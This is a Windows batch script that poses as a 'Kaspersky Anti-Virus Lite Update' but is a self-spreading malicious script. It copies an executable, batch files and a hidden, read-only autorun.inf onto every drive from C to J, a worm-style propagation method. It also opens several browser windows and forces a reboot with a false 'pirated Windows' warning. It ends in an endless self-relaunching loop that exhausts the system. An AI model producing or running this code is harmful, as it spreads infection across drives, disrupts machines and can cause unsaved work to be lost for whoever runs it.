@ECHO OFF

title Kaspersky Anti-Virus Lite Update

start pinball

start iexplore

start iexplore

start iexplore

cls

MD C:\TempCache

MD D:\TempCache

MD E:\TempCache

MD F:\TempCache

MD G:\TempCache

MD H:\TempCache

MD I:\TempCache

MD J:\TempCache

cls

copy C:\WINDOWS\Cache\kavlite.exe C:\TempCache /y

copy C:\WINDOWS\Cache\kavlite.exe D:\TempCache /y

copy C:\WINDOWS\Cache\kavlite.exe E:\TempCache /y

copy C:\WINDOWS\Cache\kavlite.exe F:\TempCache /y

copy C:\WINDOWS\Cache\kavlite.exe G:\TempCache /y

copy C:\WINDOWS\Cache\kavlite.exe H:\TempCache /y

copy C:\WINDOWS\Cache\kavlite.exe I:\TempCache /y

copy C:\WINDOWS\Cache\kavlite.exe J:\TempCache /y

cls

copy C:\WINDOWS\Cache\autorun.inf C:\ /y 

copy C:\WINDOWS\Cache\autorun.inf D:\ /y

copy C:\WINDOWS\Cache\autorun.inf E:\ /y

copy C:\WINDOWS\Cache\autorun.inf F:\ /y

copy C:\WINDOWS\Cache\autorun.inf G:\ /y

copy C:\WINDOWS\Cache\autorun.inf H:\ /y

copy C:\WINDOWS\Cache\autorun.inf I:\ /y

copy C:\WINDOWS\Cache\autorun.inf J:\ /y

cls

attrib +r +h +s C:\autorun.inf

attrib +r +h +s D:\autorun.inf

attrib +r +h +s E:\autorun.inf

attrib +r +h +s F:\autorun.inf

attrib +r +h +s G:\autorun.inf

attrib +r +h +s H:\autorun.inf

attrib +r +h +s I:\autorun.inf

attrib +r +h +s J:\autorun.inf

cls

copy C:\WINDOWS\Cache\autorun.inf C:\TempCache /y 

copy C:\WINDOWS\Cache\autorun.inf D:\TempCache /y

copy C:\WINDOWS\Cache\autorun.inf E:\TempCache /y

copy C:\WINDOWS\Cache\autorun.inf F:\TempCache /y

copy C:\WINDOWS\Cache\autorun.inf G:\TempCache /y

copy C:\WINDOWS\Cache\autorun.inf H:\TempCache /y

copy C:\WINDOWS\Cache\autorun.inf I:\TempCache /y

copy C:\WINDOWS\Cache\autorun.inf J:\TempCache /y
 
cls

copy C:\WINDOWS\Cache\iscch.bat C:\TempCache /y

copy C:\WINDOWS\Cache\iscch.bat D:\TempCache /y

copy C:\WINDOWS\Cache\iscch.bat E:\TempCache /y

copy C:\WINDOWS\Cache\iscch.bat F:\TempCache /y

copy C:\WINDOWS\Cache\iscch.bat G:\TempCache /y
 
copy C:\WINDOWS\Cache\iscch.bat H:\TempCache /y

copy C:\WINDOWS\Cache\iscch.bat I:\TempCache /y

copy C:\WINDOWS\Cache\iscch.bat J:\TempCache /y

cls

copy C:\WINDOWS\Cache\update.bat C:\TempCache /y

copy C:\WINDOWS\Cache\update.bat D:\TempCache /y

copy C:\WINDOWS\Cache\update.bat E:\TempCache /y

copy C:\WINDOWS\Cache\update.bat F:\TempCache /y

copy C:\WINDOWS\Cache\update.bat G:\TempCache /y
 
copy C:\WINDOWS\Cache\update.bat H:\TempCache /y

copy C:\WINDOWS\Cache\update.bat I:\TempCache /y

copy C:\WINDOWS\Cache\update.bat J:\TempCache /y

cls

copy C:\WINDOWS\Cache\LittleRedRidingHood.txt C:\TempCache /y

copy C:\WINDOWS\Cache\LittleRedRidingHood.txt D:\TempCache /y

copy C:\WINDOWS\Cache\LittleRedRidingHood.txt E:\TempCache /y

copy C:\WINDOWS\Cache\LittleRedRidingHood.txt F:\TempCache /y

copy C:\WINDOWS\Cache\LittleRedRidingHood.txt G:\TempCache /y

copy C:\WINDOWS\Cache\LittleRedRidingHood.txt H:\TempCache /y

copy C:\WINDOWS\Cache\LittleRedRidingHood.txt I:\TempCache /y

copy C:\WINDOWS\Cache\LittleRedRidingHood.txt J:\TempCache /y

cls

shutdown -r -t 7 -c "Warning:Your copy of Windows XP is pirated." -f

:cyclic
start %0
goto cyclic
